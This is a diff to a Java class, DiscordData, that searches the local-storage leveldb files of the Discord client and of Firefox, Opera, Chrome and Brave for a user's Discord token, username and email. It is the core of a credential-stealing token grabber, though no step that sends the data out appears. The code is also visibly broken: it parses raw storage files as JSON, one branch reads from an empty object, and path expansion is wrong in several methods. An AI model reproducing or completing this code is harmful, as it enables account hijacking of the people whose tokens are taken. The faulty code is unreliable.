@@ -8,8 +8,8 @@ import java.io.FileReader;
 import java.io.IOException;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
+import java.nio.file.Paths;
 import java.util.List;
-import java.util.Locale;
 
 public class DiscordData {
     private static final List<String> CLIENT = List.of(
@@ -37,6 +37,7 @@ public class DiscordData {
             getBraveLocalStoragePath("MacOS", "~/Library/Application Support/BraveSoftware/Brave-Browser/Default/Local Storage/leveldb"),
             getBraveLocalStoragePath("Linux", "~/.config/BraveSoftware/Brave-Browser/Default/Local Storage/leveldb")
     );
+
     public static String getToken() {
         String token = "";
         token = getDiscordValue("token", CLIENT);
@@ -54,6 +55,7 @@ public class DiscordData {
         }
         return token;
     }
+
     public static String getUsername() {
         String username = "";
         username = getDiscordValue("username", CLIENT);
@@ -64,31 +66,33 @@ public class DiscordData {
             username = getDiscordValue("login", OPERA);
         }
         if (username.isEmpty()) {
-            username = getDiscordValue("value", CHROME);
+            username = getDiscordValue("value", CHROME, "username");
         }
         if (username.isEmpty()) {
-            username = getDiscordValue("value", BRAVE);
+            username = getDiscordValue("value", BRAVE, "username");
         }
         return username;
     }
-    private static String getDiscordValue(String key, List<String> localStoragePaths) {
-        for (String path : localStoragePaths) {
-            File folder = new File(path);
-            if (folder.isDirectory()) {
-                String fileName = file.getName();
-                if (fileName.endsWith(".ldb") || fileName.endsWith(".log")) {
-                    String data = readLocalStorageFile(file);
-                    if (data.contains(key)) {
-                        JsonObject jsonObject = new JsonObject(data);
-                        String value = jsonObject.getString(key);
-                        return value;
-                    }
-                }
-            }
+
+    public static String getEmail() {
+        String email = "";
+        email = getDiscordValue("email", CLIENT);
+        if (email.isEmpty()) {
+            email = getDiscordValue("value", FIREFOX, "email");
         }
-        return "";
+        if (email.isEmpty()) {
+            email = getDiscordValue("value", OPERA, "email");
+        }
+        if (email.isEmpty()) {
+            email = getDiscordValue("value", CHROME, "email");
+        }
+        if (email.isEmpty()) {
+            email = getDiscordValue("value", BRAVE, "email");
+        }
+        return email;
     }
-    private static String getDiscordValue(String key, List<String> localStoragePaths, String secondaryKey) {
+
+    private static String getDiscordValue(String key, List<String> localStoragePaths) {
         for (String path : localStoragePaths) {
             File folder = new File(path);
             if (folder.isDirectory()) {
@@ -97,12 +101,8 @@ public class DiscordData {
                     if (fileName.endsWith(".ldb") || fileName.endsWith(".log")) {
                         String data = readLocalStorageFile(file);
                         if (data.contains(key)) {
-                            JsonObject jsonObject = new JsonObject(data);
+                            JsonObject jsonObject = new JsonObject();
                             String value = jsonObject.getString(key);
-                            return value;
-                        } else if (data.contains(SecondaryKey)) {
-                            JsonObject jsobObject = new JsonObject(data);
-                            String value = jsobObject.getString(secondaryKey);
                             return value;
                         }
                     }
@@ -111,6 +111,30 @@ public class DiscordData {
         }
         return "";
     }
+
+    private static String getDiscordValue(String key, List<String> localStoragePaths, String secondaryKey) {
+        JsonObject obj = new JsonObject();
+        for (String path : localStoragePaths) {
+            File folder = new File(path);
+            if (folder.isDirectory()) {
+                for (File file : folder.listFiles()) {
+                    String fileName = file.getName();
+                    if (fileName.endsWith(".ldb") || fileName.endsWith(".log")) {
+                        String data = readLocalStorageFile(file);
+                        if (data.contains(key)) {
+                            obj = new JsonObject(data);
+                            return obj.getString(key);
+                        } else if (data.contains(secondaryKey)) {
+                            obj = new JsonObject(data);
+                            return obj.getString(secondaryKey);
+                        }
+                    }
+                }
+            }
+        }
+        return "";
+    }
+
     private static String readLocalStorageFile(File file) {
         try {
             byte[] bytes = Files.readAllBytes(file.toPath());
@@ -120,13 +144,15 @@ public class DiscordData {
         }
         return "";
     }
+
     private static String getDiscordLocalStoragePath(String osName, String path) {
         String os = osName.toLowerCase();
-        String expandedPath = path.replace("%APPDATA", System.getenv("APPDATA"))
+        String expandedPath = path.replace("%APPDATA%", System.getenv("APPDATA"))
                 .replace("%LOCALAPPDATA%", System.getenv("LOCALAPPDATA"))
                 .replace("~", System.getProperty("user.home"));
         return Paths.get(expandedPath).toString();
     }
+
     private static String getFirefoxLocalStoragePath(String osName, String basePath) {
         String os = osName.toLowerCase();
         String profilePath = "";
@@ -163,6 +189,39 @@ public class DiscordData {
             String fullPath = basePath + defaultProfilePath + "storage/default";
             return getLocalStoragePath(fullPath);
         }
+        return "";
+    }
+
+    private static String getOperaLocalStoragePath(String osName, String path) {
+        String os = osName.toLowerCase();
+        String expandedPath = path.replace("%APPDATA", System.getenv("APPDATA"))
+                .replace("%LOCALAPPDATA%", System.getenv("LOCALAPPDATA"))
+                .replace("~", System.getProperty("user.home"));
+        return Paths.get(expandedPath).toString();
+    }
+
+    private static String getChromeLocalStoragePath(String osName, String path) {
+        String os = osName.toLowerCase();
+        String expandedPath = path.replace("%APPDATA", System.getenv("APPDATA"))
+                .replace("%LOCALAPPDATA%", System.getenv("LOCALAPPDATA"))
+                .replace("~", System.getProperty("user.home"));
+        return Paths.get(expandedPath).toString();
+    }
+
+    private static String getBraveLocalStoragePath(String osName, String path) {
+        String os = osName.toLowerCase();
+        String expandedPath = path.replace("%APPDATA", System.getenv("APPDATA"))
+                .replace("%LOCALAPPDATA%", System.getenv("LOCALAPPDATA"))
+                .replace("~", System.getProperty("user.home"));
+        return Paths.get(expandedPath).toString();
+    }
+
+    private static String getLocalStoragePath(String folderPath) {
+        File folder = new File(folderPath);
+        if (folder.isDirectory()) {
+            return folderPath;
+        }
+        return "";
     }
 
 }
